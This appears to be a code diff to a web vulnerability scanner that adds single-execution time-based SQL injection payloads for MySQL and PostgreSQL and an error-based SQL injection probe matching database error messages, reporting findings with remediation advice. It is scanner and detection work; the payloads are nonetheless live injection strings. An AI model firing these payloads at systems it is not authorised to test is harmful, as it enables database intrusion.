@@ -1,4 +1,5 @@
 """Time-based blind SQL injection — triple-confirmation zero-FP."""
+import re
 import time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from fastapi import APIRouter, Depends
@@ -21,6 +22,31 @@ _PAYLOADS = [
     for i, p in enumerate(_MERGED)
     if p.get("category") in ("time", "stacked-time", "waf-bypass") and "{N}" in p.get("payload", "")
 ][:60]  # cap at 60 per scan (was 40; AI extras add WAF-bypass variants)
+
+# SQLI-SINGLE-SLEEP-V1 — a plain "AND SLEEP(N)" runs once PER MATCHED ROW
+# (DVWA: 5 users -> 25s per probe), burning the wall-clock budget and holding
+# the target's PHP session lock so every other scanner sharing the session
+# times out. A derived-table sleep executes exactly once. Tried first.
+_SINGLE_SLEEP = [
+    ("mysql_once_str", "1' AND (SELECT 1 FROM (SELECT SLEEP({N}))vl)-- -", "MySQL"),
+    ("mysql_once_int", "1 AND (SELECT 1 FROM (SELECT SLEEP({N}))vl)", "MySQL"),
+    ("pgsql_once_str", "1' AND 1=(SELECT 1 FROM PG_SLEEP({N}))-- -", "PostgreSQL"),
+]
+_PAYLOADS = _SINGLE_SLEEP + [p for p in _PAYLOADS if p[1] not in {x[1] for x in _SINGLE_SLEEP}]
+
+# SQLI-ERROR-BASED-V1 — DBMS error signatures. Confirmation: the error
+# appears for a lone quote, is ABSENT from the benign baseline, and is ABSENT
+# again when the quote is balanced ('' / "") — i.e. the input reaches SQL.
+_SQL_ERRORS = re.compile(
+    r"(You have an error in your SQL syntax|mysqli?_fetch|mysql_num_rows|"
+    r"Warning:\s*mysqli?_|MySQLSyntaxErrorException|valid MySQL result|"
+    r"check the manual that (?:corresponds|fits) to your (?:MySQL|MariaDB)|"
+    r"PG::SyntaxError|pg_query\(\)|PostgreSQL.*?ERROR|ERROR:\s+syntax error at or near|"
+    r"unterminated quoted string at or near|Unclosed quotation mark after the character string|"
+    r"Microsoft OLE DB Provider for SQL Server|SQLServerException|ODBC SQL Server Driver|"
+    r"ORA-0\d{4}|quoted string not properly terminated|SQLite3?::|SQLITE_ERROR|"
+    r"sqlite3\.OperationalError|near \"[^\"]{0,20}\": syntax error|SQLSTATE\[\w+\])",
+    re.I)
 
 # Fallback hardcoded baseline (used only if library load failed somehow)
 if not _PAYLOADS:
@@ -110,11 +136,61 @@ def scan_sqli(req: ScanRequest, payload=Depends(verify_scan_quota)):
     _wallclock_start = time.time()
     _WALLCLOCK_BUDGET = 60.0
     _bailed = False
+    _err_hits = set()
+
+    def _err_probe(test_url, params, key):
+        """SQLI-ERROR-BASED-V1: (finding|None) using 3 fast requests."""
+        up = urlparse(test_url)
+
+        def _get(v):
+            np_ = {k: vv[0] for k, vv in params.items()}
+            np_[key] = v
+            r = safe_get(urlunparse(up._replace(query=urlencode(np_))), req=req,
+                         allow_redirects=True, timeout=10, retries=0)
+            return (r.text or "")[:60000] if r is not None else None
+        base_v = params[key][0] if params.get(key) else "1"
+        b = _get(base_v)
+        if b is None or _SQL_ERRORS.search(b):
+            return None
+        for q in ("'", '"'):
+            e = _get(base_v + q)
+            if not e:
+                continue
+            m = _SQL_ERRORS.search(e)
+            if not m:
+                continue
+            ok = _get(base_v + q + q)
+            if ok is None or _SQL_ERRORS.search(ok):
+                continue
+            return wrap_finding(
+                f"Error-based SQLi in {key!r} at {test_url}",
+                "CRITICAL", cvss="9.8", cwe="CWE-89", owasp="A03:2021",
+                remediation="Use parameterised queries (prepared statements). Never concatenate user input into SQL.",
+                evidence_marker=(f"url={test_url} param={key}: {base_v + q!r} -> database error "
+                                 f"{m.group(0)[:80]!r}; balanced {base_v + q + q!r} and baseline -> no error"))
+        return None
+
+    for test_url, params in test_urls[:12]:
+        for key in list(params.keys())[:3]:
+            if time.time() - _wallclock_start > 20:
+                break
+            tests += 1
+            try:
+                f = _err_probe(test_url, params, key)
+            except Exception:
+                f = None
+            if f:
+                findings.append(f)
+                _err_hits.add((urlparse(test_url).path, key))
+                confirmed.append({"url": test_url, "param": key, "method": "error"})
+
     for test_url, params in test_urls[:12]:
         if _bailed: break
         url_parsed = urlparse(test_url)
         for key in list(params.keys())[:3]:
             if _bailed: break
+            if (url_parsed.path, key) in _err_hits:
+                continue   # already proven; spend the budget elsewhere
             for name, tmpl, db in _PAYLOADS:
                 if time.time() - _wallclock_start > _WALLCLOCK_BUDGET:
                     _bailed = True; break
